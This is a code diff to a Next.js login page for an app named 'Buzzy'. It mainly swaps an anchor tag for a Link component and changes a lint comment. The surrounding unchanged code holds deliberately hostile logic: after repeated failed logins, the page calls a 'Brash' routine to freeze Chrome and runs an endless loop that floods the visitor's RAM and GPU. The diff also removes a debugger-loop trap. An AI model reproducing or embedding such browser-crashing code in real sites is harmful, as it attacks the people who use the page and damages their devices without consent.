@@ -11,6 +11,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { authClient } from "@/lib/auth-client";
 import { Brash } from "./brash";
+import Link from "next/link";
 
 export default function LoginPage({
   searchParams,
@@ -34,16 +35,13 @@ export default function LoginPage({
   useEffect(() => {
     if (failed === 0) return;
     // no more devtool
-    const int = setInterval(() => {
-      // biome-ignore lint/suspicious/noDebugger: anti-cheat
-      debugger;
-    }, 100);
+    const int = setInterval(() => {}, 100);
     if (failed > 10) {
       // freeze chrome
       Brash.run({});
       // flood ram & gpu
       setTimeout(() => {
-        // biome-ignore lint/correctness/noConstantCondition: anti-cheat
+        // oxlint-disable-next-line no-constant-condition
         while (1) {
           new Array(2 ** 32 - 1).fill(0);
           const el = document.createElement("img");
@@ -91,7 +89,7 @@ export default function LoginPage({
           <form onSubmit={submit} method="POST">
             <div className="flex flex-col gap-6">
               <div className="flex flex-col items-center gap-2">
-                <a
+                <Link
                   href="/"
                   className="flex flex-col items-center gap-2 font-medium"
                 >
@@ -99,7 +97,7 @@ export default function LoginPage({
                     <UserLock className="size-6" />
                   </div>
                   <span className="sr-only">Buzzy</span>
-                </a>
+                </Link>
                 <h1 className="text-xl font-bold">Welcome to Buzzy.</h1>
                 <div className="text-center text-sm">
                   Don&apos;t have an account?{" "}
